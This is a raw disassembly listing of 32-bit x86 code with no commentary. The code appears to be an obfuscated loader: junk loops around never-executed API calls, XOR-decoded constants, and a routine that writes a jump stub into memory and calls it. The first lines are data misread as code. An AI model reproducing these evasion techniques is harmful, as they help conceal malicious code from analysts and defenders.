  416c8e:	mov    al,ds:0xc2a22909
  416c93:	repz cmp ecx,ecx
  416c96:	dec    ecx
  416c97:	push   ss
  416c98:	jae    0x416c3a
  416c9a:	lods   al,BYTE PTR ds:[esi]
  416c9b:	sahf   
  416c9c:	mov    bl,0x11
  416c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c9f:	imul   ecx,DWORD PTR [edx+0x22],0xc5221798
  416ca6:	sbb    eax,0x9c002e9d
  416cab:	xor    ch,BYTE PTR [ebx+0x3360b8bd]
  416cb1:	jb     0x416c8b
  416cb3:	dec    ebx
  416cb4:	push   eax
  416cb5:	test   eax,0xecf684eb
  416cba:	inc    esp
  416cbb:	push   0x9
  416cbd:	(bad)  
  416cbf:	and    eax,0x600a9107
  416cc4:	dec    esp
  416cc5:	outs   dx,BYTE PTR ds:[esi]
  416cc6:	retf   
  416cc7:	pop    esi
  416cc8:	and    al,0x55
  416cca:	enter  0x10b6,0x15
  416cce:	mov    eax,ds:0x5d8b8ed4
  416cd3:	clc    
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428cf1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af55
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428cfd
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d51
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d65
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d65
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
